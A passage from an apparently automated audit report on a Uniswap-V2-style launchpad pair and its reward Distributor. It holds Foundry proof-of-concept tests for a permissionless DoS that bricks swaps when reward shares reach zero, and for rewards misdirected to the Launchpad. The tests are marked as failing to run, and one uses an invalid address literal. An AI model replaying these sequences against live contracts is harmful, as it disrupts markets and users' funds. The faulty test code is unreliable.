        vm.prank(address(factory));
        pair = new GTELaunchpadV2Pair();

        // Initialize pair with distributor set
        vm.prank(address(factory));
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));

        // Seed initial liquidity into the pair and mint LP to launchpadLp
        uint256 amount0 = 1_000_000e18;
        uint256 amount1 = 1_000_000e18;
        token0.mint(address(pair), amount0);
        token1.mint(address(pair), amount1);

        vm.prank(launchpadLp);
        pair.mint(launchpadLp);
    }

    function _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        // Standard Uniswap V2 formula with 0.3% fee
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function testSwapRevertsWhenNoSharesToIncentivize() public {
        // Rewards pool exists but totalShares == 0 => addRewards will revert.
        address trader = address(0xTRADER);
        uint256 amountIn = 1_000e18;
        token0.mint(trader, amountIn);

        // Trader sends token0 into the pair, then swaps for token1
        vm.prank(trader);
        token0.transfer(address(pair), amountIn);

        // Ensure timeElapsed > 0 for _update() to distribute immediately
        vm.warp(block.timestamp + 1);

        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 amount1Out = _getAmountOut(amountIn, reserve0, reserve1);

        vm.prank(trader);
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, amount1Out, trader, bytes(""));
    }
}


## Suggested Mitigation
Break the hard dependency of AMM core paths on external rewards distribution so that addRewards failures cannot revert swaps/mints/burns/sync. Safe options:
- Preferred (Distributor-side, simplest): In Distributor.addRewards, remove the rs.totalShares == 0 revert. Instead, accept tokens and accumulate them as pending (pendingBaseRewards / pendingQuoteRewards). The RewardsTrackerLib already handles totalShares == 0 by not updating acc*PerShare until shares become non-zero. This preserves accounting and eliminates DoS while allowing incentive top-ups during bonding or after exits.
- Pair-side try/catch: In GTELaunchpadV2Pair._distributeLaunchpadFees, wrap the external call in try/catch. Only delete accruedLaunchpadFee0/1 after a successful addRewards. On catch, re-credit the fees back into accruedLaunchpadFee0/1 and emit LaunchpadFeesAccrued(fee0, fee1), then continue without reverting.
- Proactive check: Before calling addRewards, query the distributor to confirm the pool exists and has shares (e.g., via a lightweight view like getRewardsPoolData and verifying quoteAsset != 0 and totalShares > 0). If inactive or missing, skip distribution and keep accruing inside the pair.

Any of these ensures AMM availability is never gated by distributor state or callbacks, fully removing the DoS vector.





 **Derived From** : Launchpad AMM swaps can be DOSed when rewards shares hit zero

## [M-7]. GTELaunchpadV2Pair swap/mint/burn/sync can be DOSed when Distributor totalShares becomes zero

### Finding Severity Justification: A permissionless denial-of-service can brick a core AMM pair: swap, mint, burn, and sync revert when the Distributor reward pool has zero totalShares while the pair still accrues launchpad fees. This halts trading and LP operations until a privileged actor intervenes. No direct fund loss occurs, but protocol availability and market functioning are significantly impacted.
## Derived From Pattern/Invariant
Launchpad AMM swaps can be DOSed when rewards shares hit zero

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair / Distributor.swap / mint / burn / sync / _update / _distributeLaunchpadFees / addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The custom Uniswap V2 pair `GTELaunchpadV2Pair` distributes a fraction of swap fees to a `launchpadFeeDistributor` (the `Distributor` contract). This distribution happens synchronously in the hot path of `_update`, which is called by `swap`, `mint`, `burn`, and `sync`:

```solidity
function _update(
    uint256 balance0,
    uint256 balance1,
    uint112 _reserve0,
    uint112 _reserve1,
    uint112 newLaunchpadFee0,
    uint112 newLaunchpadFee1
) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

    uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast;
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        ...
        if (launchpadFeeDistributor > address(0)) {
            if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                delete accruedLaunchpadFee0;
                delete accruedLaunchpadFee1;
                _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
            }
        }
    } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
        accruedLaunchpadFee0 = totalLaunchpadFee0;
        accruedLaunchpadFee1 = totalLaunchpadFee1;
        emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;

        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

        emit LaunchpadFeesCollected(fee0, fee1);
    }
}
```

`IDistributor.addRewards` can revert when its reward pool for the launch asset has zero total shares:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

`rs.totalShares` is purely user-driven staking state maintained by `RewardsTrackerLib` via the `Distributor` interface. When all stakers fully exit (e.g. via launchpad bonders unlocking), `rs.totalShares` legitimately becomes 0 while the AMM pair still has `launchpadFeeDistributor != address(0)` and `rewardsPoolActive > 0`.

In that state, any call to `_update` that:

- Has `timeElapsed > 0` and non-zero reserves, and
- Has `totalLaunchpadFee0 | totalLaunchpadFee1 > 0` (i.e. any accumulated fee to distribute)

will execute `_distributeLaunchpadFees`, which in turn calls `Distributor.addRewards`. Because `rs.totalShares == 0`, `addRewards` reverts with `NoSharesToIncentivize()`. The revert bubbles up and **reverts the entire `_update` call** and thus the outer operation.

Since `_update` is used by all core AMM methods:

```solidity
function swap(...) external lock { ... _update(..., launchpadFee0, launchpadFee1); ... }
function mint(address to) external lock returns (uint256 liquidity) { ... _update(...); ... }
function burn(address to) external lock returns (uint256 amount0, uint256 amount1) { ... _update(...); ... }
function sync() external lock { _update(...); }
```

once `rs.totalShares` hits zero while rewards accrual is still active, **the next swap/mint/burn/sync that triggers fee distribution will revert**, and so will all subsequent ones until a privileged actor calls `Distributor.endRewards(pair)` which in turn calls `pair.endRewardsAccrual()`.

Because `rs.totalShares` can reach zero solely via normal user unstaking flow (triggered from the launchpad), this is a classic griefable-callback DoS: pool availability depends on an external module whose revert conditions are partially controlled by unprivileged users.

## Impact
Once the Distributor's reward pool for a launch asset has totalShares == 0 while rewards remain active on the pair, any swap, liquidity mint/burn, or sync that attempts to distribute launchpad fees will revert. This bricks the AMM pool for all traders and LPs until governance explicitly disables rewards for that pair via endRewards, causing loss of availability and potentially severe market disruption.

## Command to Run Test


## Proof of Concept
High-level exploit steps:

1. A launchpad pool is live with `launchpadFeeDistributor` configured and `rewardsPoolActive > 0`. Users are staking, so `rs.totalShares > 0`. The AMM pair has liquidity and is used for swaps, accruing launchpad fees.
2. Over time, some swaps occur, and `_update` accrues launchpad fees into `accruedLaunchpadFee0/1` or distributes them when called across blocks.
3. Eventually, all bond/stake positions are fully exited via launchpad actions, driving `rs.totalShares` in `Distributor` down to 0. This is fully achievable through normal user flows (last staker exiting).
4. The launchpad admin has **not yet** called `Distributor.endRewards(pair)` → `pair.endRewardsAccrual()`, so `rewardsPoolActive` in the pair is still 1 and the pair still computes launchpad fees on each swap.
5. The next swap that crosses a block boundary and has non-zero `totalLaunchpadFee0 | totalLaunchpadFee1` calls `_distributeLaunchpadFees`, which executes `Distributor.addRewards`.
6. Inside `addRewards`, the relevant reward pool has `rs.totalShares == 0`, so it reverts with `NoSharesToIncentivize()`.
7. This revert propagates out of `_distributeLaunchpadFees` and `_update`, causing the outer `swap` (or `mint`/`burn`/`sync`) to revert.
8. Because neither `accruedLaunchpadFee*` nor `rewardsPoolActive` are cleared on failure, every subsequent attempt to call `swap`/`mint`/`burn`/`sync` that hits the same branch will revert again.
9. The AMM pool remains unusable until a privileged actor (the launchpad) calls `Distributor.endRewards(pair)` to disable rewards and clear accrued fees.

Thus, any final staker (in coordination with normal trading) can unintentionally or maliciously cause the AMM to be DoS'ed until governance intervenes.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20LP is Test {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LaunchpadFeeDosTest is Test, IUniswapV2Factory {
    address internal _feeTo;
    address internal _feeToSetter;

    function feeTo() external view override returns (address) { return _feeTo; }
    function feeToSetter() external view override returns (address) { return _feeToSetter; }

    function getPair(address, address) external pure override returns (address pair) { return address(0); }
    function allPairs(uint256) external pure override returns (address pair) { return address(0); }
    function allPairsLength() external pure override returns (uint256) { return 0; }
    function createPair(address, address) external pure override returns (address pair) { revert("unused"); }
    function setFeeTo(address v) external override { _feeTo = v; }
    function setFeeToSetter(address v) external override { _feeToSetter = v; }

    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20LP token0;
    MockERC20LP token1;

    address lpProvider = address(0x1);
    address staker     = address(0x2);
    address trader1    = address(0x3);
    address trader2    = address(0x4);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this));

        pair = new GTELaunchpadV2Pair();

        token0 = new MockERC20LP();
        token1 = new MockERC20LP();

        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        distributor.createRewardsPair(address(token0), address(token1));
        distributor.increaseStake(address(token0), staker, 1);

        token0.mint(lpProvider, 1_000_000 ether);
        token1.mint(lpProvider, 1_000_000 ether);

        vm.startPrank(lpProvider);
        token0.transfer(address(pair), 1_000_000 ether);
        token1.transfer(address(pair), 1_000_000 ether);
        pair.mint(address(this));
        vm.stopPrank();
    }

    function _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0 && reserveIn > 0 && reserveOut > 0, "bad params");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function testSwapAndSyncRevertWhenSharesZero() public {
        // First swap to accrue launchpad fees while totalShares > 0 (accrued in-block)
        token0.mint(trader1, 100_000 ether);
        vm.startPrank(trader1);
        token0.transfer(address(pair), 100_000 ether);
        (uint112 r0, uint112 r1, ) = pair.getReserves();
        uint256 amount1Out = _getAmountOut(100_000 ether, r0, r1);
        pair.swap(0, amount1Out, trader1, "");
        vm.stopPrank();

        // Drive totalShares to zero via normal unstake flow
        distributor.decreaseStake(address(token0), staker, 1);

        // Next block => _update() will try to distribute previously accrued fees
        vm.warp(block.timestamp + 1);

        // Swap reverts due to Distributor.addRewards -> NoSharesToIncentivize()
        token0.mint(trader2, 10_000 ether);
        vm.startPrank(trader2);
        token0.transfer(address(pair), 10_000 ether);
        (r0, r1, ) = pair.getReserves();
        uint256 amount1Out2 = _getAmountOut(10_000 ether, r0, r1);
        vm.expectRevert();
        pair.swap(0, amount1Out2, trader2, "");
        vm.stopPrank();

        // Core maintenance op also reverts (sync)
        vm.expectRevert();
        pair.sync();
    }
}


## Suggested Mitigation
Do NOT make addRewards a silent no-op when totalShares == 0, as the pair pre-subtracts fees from balances to compute reserves before calling the distributor. If the transfer is skipped, those tokens remain in the pair as “excess” and become skimmable via skim(), effectively leaking rewards. Safer options:

- Preferred: Make Distributor.addRewards non-reverting for zero-share pools and still accept the rewards by accruing them into pendingBaseRewards/pendingQuoteRewards, and transfer the tokens in. This preserves accounting and avoids DoS while keeping rewards safe until shares return.

- Alternatively (pair-side hardening): Wrap the external call in try/catch and re-accrue on failure so AMM ops never revert and the subtracted fees remain tracked (and therefore protected from skim):
  - Before calling addRewards, delete accruedLaunchpadFee0/1 as today.
  - try addRewards(...); on success, emit and continue.
  - catch { set accruedLaunchpadFee0/1 back to totalLaunchpadFee0/1 so reserves remain consistent and fees are not skimmable; do not revert. }

- Optional: Expose a cheap view in Distributor (e.g., hasShares(launchAsset) -> bool) and gate the pair’s distribution call on it to save gas and avoid try/catch in the common case.

Any of these approaches (accept-into-pending in Distributor, or try/catch with re-accrual in the pair) fully removes the permissionless DoS while preserving fee funds.


## [M-8]. GTELaunchpadV2Pair launchpad fee callback reverts when totalShares==0, DoSing swaps/mints/burns/sync

### Finding Severity Justification: Swap/mint/burn/sync on GTELaunchpadV2Pair can be reverted (pair bricked) once Distributor.totalShares becomes 0 while rewardsPoolActive remains 1. This causes addRewards() to revert inside the mandatory external callback during _update, denying trading and LP exits until a privileged account calls endRewards. This is a clear protocol availability failure affecting user operations and temporarily locking liquidity, but no direct loss/theft of assets occurs and an admin can unbrick, so Medium is appropriate.
## Derived From Pattern/Invariant
Launchpad AMM swaps can be DOSed when rewards shares hit zero

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair._update (via swap / mint / burn / sync)

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair integrates with a Distributor to send a portion of swap fees to a staking rewards pool. In the hot path of _update (called by swap, mint, burn, and sync), accumulated launchpad fees are forwarded to launchpadFeeDistributor via _distributeLaunchpadFees:

- In _update:
  uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
  uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
  uint32 timeElapsed = blockTimestamp - blockTimestampLast;
  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
      ...
      if (launchpadFeeDistributor > address(0)) {
          if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
              delete accruedLaunchpadFee0;
              delete accruedLaunchpadFee1;
              _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
          }
      }
  } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
      // accrue fees until next block
      accruedLaunchpadFee0 = totalLaunchpadFee0;
      accruedLaunchpadFee1 = totalLaunchpadFee1;
      emit LaunchpadFeesAccrued(...);
  }

- In _distributeLaunchpadFees:
  IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

Distributor.addRewards enforces that a rewards pool must have active shares:

  RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0 or token1);
  if (rs.totalShares == 0) revert NoSharesToIncentivize();

This means that once the staking pool for the launch asset is completely exited (rs.totalShares == 0), any subsequent attempt by the pair to forward accumulated launchpad fees will revert inside addRewards.

A realistic sequence:
- A launchpad-created pair starts with stakers and rs.totalShares > 0.
- Over time, all stakers fully unstake through Distributor.decreaseStake, driving rs.totalShares down to 0. The pair is still configured with a non-zero launchpadFeeDistributor and rewardsPoolActive > 0.
- Trades on the pair continue and accrue launchpad fees; when timeElapsed == 0 (same block), _update stores these in accruedLaunchpadFee* instead of distributing them.
- On the first subsequent call to swap, mint, burn or sync that crosses to a new block (timeElapsed > 0) and sees totalLaunchpadFee* > 0, _update calls _distributeLaunchpadFees, which calls addRewards.
- addRewards sees rs.totalShares == 0 and reverts with NoSharesToIncentivize(). The revert bubbles up, reverting the entire outer operation.

Because _update is invoked by all core AMM mutating functions (swap, mint, burn, sync) and there is no try/catch or fallback around the external call to Distributor, the pool can be completely bricked for all users solely because previous stakers have fully exited. This is a classic griefable-callback DoS: a non-privileged sequence of user actions (unstaking to zero shares plus normal swaps) leads to a state where a mandatory external callback always reverts, making the AMM unusable until a privileged party explicitly disables rewards.

## Impact
If all stakers in the Distributor rewards pool for a launch asset fully unstake so that rs.totalShares becomes zero while the GTELaunchpadV2Pair remains configured with a non-zero launchpadFeeDistributor and rewardsPoolActive > 0, any subsequent operation that causes the pair to attempt fee distribution (_distributeLaunchpadFees) will revert. This includes swaps, mints, burns, and sync. The AMM pool becomes non-functional: traders cannot swap, LPs cannot burn liquidity, and reserves cannot be updated, effectively freezing the market until the launchpad/admin calls Distributor.endRewards (which in turn calls pair.endRewardsAccrual) to disable rewards. This is a protocol-wide availability failure for that pair caused only by normal user behavior.

## Command to Run Test


## Proof of Concept
Revised high-level PoC steps (key fix: ensure launchpadLp actually owns LP tokens so fees > 0):

1) Deploy GTELaunchpadV2Pair with token0, token1, and set launchpadFeeDistributor to Distributor. Set launchpadLp to the same address that will receive the LP tokens from mint (e.g., the initial liquidity provider) so that _getLaunchpadFees returns a non-zero amount.
2) Initialize Distributor and set this test/deployer as the launchpad. Create rewards pool for (token0, token1) via Distributor.createRewardsPair(token0, token1).
3) Temporarily add and then fully remove stake via Distributor.increaseStake(token0, staker, 1) and Distributor.decreaseStake(token0, staker, 1), so rs.totalShares becomes 0 while the pair’s launchpadFeeDistributor remains set and rewardsPoolActive is still 1.
4) Provide initial liquidity to the pair (mint) so reserves are both non-zero.
5) In the same block, perform a swap that sends amount0In (or amount1In) to the pair BEFORE calling swap, and request a small amountOut. Because launchpadLp holds LP tokens, _getLaunchpadFees will return a non-zero fee. Since timeElapsed == 0 on this second _update of the block, these fees are stored in accruedLaunchpadFee* (not distributed yet).
6) Advance the block timestamp by 1.
7) Call pair.sync() (or swap/mint/burn). Now timeElapsed > 0 and total accrued fees > 0, so _update attempts _distributeLaunchpadFees which calls Distributor.addRewards.
8) Distributor.addRewards sees rs.totalShares == 0 and reverts with NoSharesToIncentivize(), reverting sync/swap/mint/burn and bricking the pair until endRewards is called by the privileged launchpad/admin.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract GTELaunchpadV2PairDoSTest is Test {
    MockERC20 token0;
    MockERC20 token1;
    Distributor distributor;
    GTELaunchpadV2Pair pair;

    // Make this test contract act as the UniswapV2 factory
    function feeTo() external view returns (address) {
        return address(0);
    }

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        distributor = new Distributor();
        distributor.initialize(address(this)); // this contract is the launchpad

        pair = new GTELaunchpadV2Pair();
        // IMPORTANT: set launchpadLp = address(this) (LP minter) so fee share is non-zero
        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        // create rewards pool for token0/token1
        distributor.createRewardsPair(address(token0), address(token1));

        // Have some temporary stake so rewards pool is valid, then fully exit to bring totalShares back to 0
        distributor.increaseStake(address(token0), address(this), 1);
        distributor.decreaseStake(address(token0), address(this), 1);

        // Provide initial liquidity to the pair
        token0.mint(address(this), 1_000 ether);
        token1.mint(address(this), 1_000 ether);
        token0.transfer(address(pair), 1_000 ether);
        token1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));
    }

    function testLaunchpadFeeCallbackDoSWhenNoShares() public {
        // Same block: pre-send token0 as input, then request small token1 out
        token0.mint(address(this), 100 ether);
        token0.transfer(address(pair), 100 ether); // amount0In
        pair.swap(0, 1 ether, address(this), new bytes(0)); // amount1Out small

        // Ensure fees actually accrued (because launchpadLp holds LP tokens)
        (uint112 accrued0, uint112 accrued1, ) = pair.getAccruedLaunchpadFees();
        assertTrue(accrued0 > 0 || accrued1 > 0, "no fees accrued");

        // Next block: any _update that tries to distribute will revert due to NoSharesToIncentivize
        vm.warp(block.timestamp + 1);
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.sync();
    }
}


## Suggested Mitigation
Fix the hard dependency on a successful external callback in _update so core AMM ops cannot be bricked by Distributor state:

Preferred minimal change (pair-side, resilient and consistent with reserves/fee accounting):
- Do not delete accruedLaunchpadFee0/1 before attempting distribution.
- Wrap the external call in try/catch and only clear accrued fees after a successful addRewards. On failure, keep accruedLaunchpadFee0/1 equal to the total fees and return without reverting. This preserves the invariant that reserves exclude accrued fees (as they do today) and allows retrying in a later block or after admin intervention, without blocking swaps/mints/burns/sync.
- Concretely in _update:
  - Compute totalLaunchpadFee* as today.
  - If timeElapsed > 0 and totalLaunchpadFee* > 0:
    - try { _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1); } catch { accruedLaunchpadFee0 = totalLaunchpadFee0; accruedLaunchpadFee1 = totalLaunchpadFee1; emit LaunchpadFeesLastAccrued(totalLaunchpadFee0, totalLaunchpadFee1); }
    - Only set accruedLaunchpadFee* = 0 after a successful distribution.
  - Keep subtracting totalLaunchpadFee* from reserves as today so accrued fees remain excluded from reserves.

Optional/alternative enhancements:
- Add a lightweight pre-check to skip distribution when no active shares: query Distributor.getRewardsPoolData(launchAsset).totalShares > 0 (where launchAsset is token0 or token1 depending on which pool exists). If zero, accrue and skip external call.
- If modifying Distributor is acceptable, add a view or dedicated function that safely reports whether a given pair’s rewards pool is active, or implement an addRewards variant that buffers incoming amounts without reverting and without zeroing pending when totalShares == 0 (to avoid the current RewardsTracker update() semantics). This requires careful design to prevent loss or unintended skimming of buffered rewards.





 **Derived From** : AccountingInvariantViolation in Distributor._distributeAssets for stake/unstake

## [H-9]. Staker rewards realized during increaseStake/decreaseStake are paid to Launchpad instead of the beneficiary account

### Finding Severity Justification: Realized (matured) rewards during stake/unstake are transferred to the Launchpad (msg.sender) instead of the end user whose rewardDebt is advanced. This permanently deprives users of claimable rewards unless an off-contract/manual forwarding occurs. Under the rubric, loss of matured yield is treated as High severity.
## Derived From Pattern/Invariant
AccountingInvariantViolation in Distributor._distributeAssets for stake/unstake

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake / decreaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: While the code clearly pays out to msg.sender (Launchpad), we do not have the Launchpad implementation to prove or disprove whether it subsequently forwards rewards to users’ balances. The observable contract behavior alone supports the misdirection bug, but lacking the Launchpad code introduces small uncertainty about intended routing.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
Distributor.increaseStake and decreaseStake are called only by the Launchpad contract and take an account parameter representing the end user whose staking shares should change. They delegate to RewardsTrackerLib.stake/unstake, which calculate baseAmount and quoteAmount as the pending rewards owed to that user before updating their shares and debts. However, Distributor then passes these amounts into _distributeAssets, which transfers tokens to msg.sender, not to account. For example: in increaseStake, (baseAmount, quoteAmount) = rs.stake(account, shares); _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount); and _distributeAssets does base.safeTransfer(msg.sender, baseAmount); quote.safeTransfer(msg.sender, quoteAmount). Because msg.sender is the Launchpad (enforced by onlyLaunchpad), any rewards realized as part of stake/unstake flows are transferred to the Launchpad contract, while the user's baseRewardDebt/quoteRewardDebt are advanced as if those rewards had been paid to the user. From the user's perspective, the rewards are silently lost: they will not be re-claimable via claimRewards later, because the debt has already been updated. This violates the core invariant that rewards removed from totalPendingRewards[asset] for a user interaction are actually transferred to that user.

## Impact
Whenever a user's stake or unstake operation realizes pending rewards (which is the normal behavior in common reward-distribution patterns), those tokens are sent to the Launchpad contract instead of the user but are still deducted from totalPendingRewards and from the user's future entitlement via updated rewardDebt. This causes users to permanently lose some or all of their earned rewards during stake/unstake events; over time, a large portion of the rewards pool can be misdirected away from users without any way for them to reclaim it on-chain.

## Command to Run Test


## Proof of Concept
Both increaseStake and decreaseStake realize any pending rewards for the specified user before updating their shares/debts via RewardsTrackerLib. Distributor then calls _distributeAssets, which transfers base/quote tokens to msg.sender. Because these functions are onlyLaunchpad, msg.sender is the Launchpad and not the beneficiary (account). The realized rewards are deducted from totalPendingRewards and the user’s rewardDebt is advanced, but the tokens are actually sent to the Launchpad. The user cannot claim those already-realized rewards later because their debt has been updated. This occurs on both stake and unstake paths:
- increaseStake: pending for existingShares is realized and paid to Launchpad; user’s shares are increased and debts set to include new shares, making realized rewards unclaimable later by the user.
- decreaseStake: pending for existingShares is realized and paid to Launchpad; user’s shares are reduced and debts updated, again making realized rewards unclaimable by the user.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract StakeRewardsMisdirectedTest is Test {
    Distributor distributor;
    ERC20Mock base;
    ERC20Mock quote;
    address launchpad;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        launchpad = address(this);
        distributor.initialize(launchpad); // this contract is launchpad
        base = new ERC20Mock();
        quote = new ERC20Mock();
        distributor.createRewardsPair(address(base), address(quote));
        // Give user some shares; no rewards yet
        distributor.increaseStake(address(base), user, 10);
        // Fund rewards pool with 1000 base
        base.mint(address(this), 1000);
        base.approve(address(distributor), 1000);
        distributor.addRewards(address(base), address(quote), 1000, 0);
    }

    function test_increaseStakePaysLaunchpadNotUser_andUserCannotClaim() public {
        uint256 lpBefore = base.balanceOf(launchpad);
        uint256 userBefore = base.balanceOf(user);
        // Realize rewards for existing 10 shares when adding 5 more
        (uint256 baseAmt,) = distributor.increaseStake(address(base), user, 5);
        assertGt(baseAmt, 0);
        // Launchpad receives realized rewards
        assertEq(base.balanceOf(launchpad), lpBefore + baseAmt, "launchpad should receive realized rewards");
        assertEq(base.balanceOf(user), userBefore, "user should not receive during stake");
        // User cannot reclaim what was realized to launchpad
        vm.prank(user);
        (uint256 claimBase,) = distributor.claimRewards(address(base));
        assertEq(claimBase, 0, "user claim should be zero after debts advanced");
        assertEq(base.balanceOf(user), userBefore, "user balance unchanged after claim");
    }

    function test_decreaseStakePaysLaunchpadNotUser_andUserCannotClaim() public {
        uint256 lpBefore = base.balanceOf(launchpad);
        uint256 userBefore = base.balanceOf(user);
        // Unstake realizes pending rewards for existing shares
        (uint256 baseAmt,) = distributor.decreaseStake(address(base), user, 5);
        assertGt(baseAmt, 0);
        // Launchpad receives realized rewards
        assertEq(base.balanceOf(launchpad), lpBefore + baseAmt, "launchpad should receive realized rewards");
        assertEq(base.balanceOf(user), userBefore, "user should not receive during unstake");
        // User cannot reclaim what was realized to launchpad
        vm.prank(user);
        (uint256 claimBase,) = distributor.claimRewards(address(base));
        assertEq(claimBase, 0, "user claim should be zero after debts advanced");
        assertEq(base.balanceOf(user), userBefore, "user balance unchanged after claim");
    }
}


## Suggested Mitigation
Modify _distributeAssets to accept a beneficiary address and use it for transfers. Then pass the correct beneficiary in each call site:
- function _distributeAssets(address to, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal { ... base.safeTransfer(to, baseAmount); quote.safeTransfer(to, quoteAmount); }
- increaseStake/decreaseStake: call _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).
- claimRewards: call _distributeAssets(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount).
This ensures realized rewards on stake/unstake are paid to the intended user rather than the Launchpad.





 **Derived From** : RewardsTracker share-based accounting can overflow 96-bit debts causing reward misaccounting

